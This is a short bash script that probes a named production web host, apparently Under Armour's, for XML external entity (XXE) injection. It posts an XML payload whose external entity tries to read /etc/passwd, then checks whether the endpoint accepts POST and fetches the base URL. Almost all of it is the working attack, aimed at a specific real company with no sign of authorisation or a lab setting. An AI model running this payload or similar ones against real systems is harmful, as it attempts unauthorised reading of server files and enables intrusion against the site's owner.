#!/bin/bash

echo "=== Testing XXE on armouru2.underarmour.com ==="
echo ""

# Test 1: Basic XXE payload
echo "[Test 1] Basic XXE payload:"
curl -s -X POST "https://armouru2.underarmour.com" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
  2>&1 | head -20
echo ""

# Test 2: Check if POST endpoint exists
echo "[Test 2] Check POST endpoint:"
curl -s -X POST "https://armouru2.underarmour.com" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>data</test>' \
  2>&1 | head -10
echo ""

# Test 3: GET request
echo "[Test 3] GET request to base URL:"
curl -s "https://armouru2.underarmour.com" 2>&1 | head -10
echo ""

echo "=== Tests completed ==="
